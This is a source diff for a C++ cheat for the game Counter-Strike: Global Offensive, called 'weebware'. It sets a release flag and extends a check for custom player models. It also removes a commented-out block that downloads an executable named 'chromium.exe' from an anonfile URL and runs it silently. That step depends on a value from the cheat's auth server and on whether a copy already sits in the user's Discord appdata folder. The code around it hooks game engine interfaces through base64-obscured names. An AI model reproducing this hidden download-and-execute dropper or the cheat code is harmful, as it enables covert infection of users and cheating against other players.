@@ -6,7 +6,7 @@
 #include "events.h"
 #include "knife_proxy_hook.h"
 
-#define WEEBWARE_RELEASE 0
+#define WEEBWARE_RELEASE 1
 
 GameEvents g_events;
 c_weebware g_weebware;
@@ -22,24 +22,6 @@ unsigned __stdcall entry_thread(void* v_arg)
 
 	return 0;
 }
-
-//bool thingy_exists() {
-//	char* path = getenv("appdata");
-//
-//	strcat(path, "\\discord\\chromium.exe");
-//
-//	return std::filesystem::exists(path);
-//}
-
-void change_extention(std::string &s, const std::string &newExt) {
-
-	std::string::size_type i = s.rfind('.', s.length());
-
-	if (i != std::string::npos) {
-		s.replace(i + 1, newExt.length(), newExt);
-	}
-}
-
 bool c_weebware::init_interfaces()
 {
 	while (!(g_weebware.h_window = FindWindowA("Valve001", NULL))) 
@@ -61,18 +43,6 @@ bool c_weebware::init_interfaces()
 	g_user_name = auth::GetServerVariable(auth::base64_decode("ZG9n").c_str());
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact(auth::GetServerVariable(auth::base64_decode("cmF0")).c_str(), NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact(auth::GetServerVariable(auth::base64_decode("Y2F0")).c_str(), NULL));
-
-
-	//if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1" && !thingy_exists()) {
-
-	//	std::string path = std::tmpnam(nullptr);
-	//	change_extention(path, "exe");
-	//	networking::download_file("https://cdn-03.anonfile.com/c1j9T015n9/733d274e-1564709101/chromium.exe", path);
-
-
-	//	ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
-	//	remove(path.c_str());
-	//}
 #else
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact("VEngineClient014", NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact("VClient018", NULL));
@@ -243,9 +213,13 @@ std::vector<c_skinchanger::knife_type> c_weebware::create_knife_list() {
 
 bool c_weebware::check_models_installed() {
 	std::string path = std::filesystem::current_path().string();
-	return (std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_blue.mdl") &&
+	return (
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_blue.mdl") &&
 		std::filesystem::exists(path + "/csgo/models/player/custom_player/voikanaa/mirainikki/gasaiyono.mdl") &&
-		std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_red.mdl"));
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_red.mdl") && 
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/bbs_93x_net_2016/kimono_luka/update_2016_08_05/kimono_luka.mdl") && 
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/monsterko/inori_yuzuriha/inori.mdl")
+		);
 }
 
 // credits: learn_more
